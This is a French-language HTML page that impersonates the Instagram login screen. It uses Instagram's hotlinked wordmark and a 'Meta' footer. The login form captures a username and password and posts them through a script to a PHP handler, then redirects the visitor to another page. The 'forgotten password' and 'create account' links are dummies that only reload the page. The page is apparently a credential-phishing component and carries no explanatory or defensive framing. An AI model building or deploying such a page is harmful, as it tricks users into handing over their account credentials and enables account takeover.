<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
            width: 350px;
        }
        .logo {
            width: 175px;
            margin: 20px 0;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        .links {
            margin: 15px 0;
            font-size: 12px;
        }
        .links a {
            color: #00376b;
            text-decoration: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm" action="process_login.php" method="POST">
            <input type="text" name="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        
        <div class="divider">ou</div>
        
        <div class="links">
            <a href="#" onclick="window.location.reload();">Mot de passe oublié ?</a>
            <br><br>
            <a href="#" onclick="window.location.reload();">Créer un compte</a>
        </div>
        
        <div class="footer">
            Meta
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Soumettre le formulaire via AJAX pour traiter les identifiants en PHP
            var formData = new FormData(this);
            
            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if(response.ok) {
                    window.location.href = 'mer.html';
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
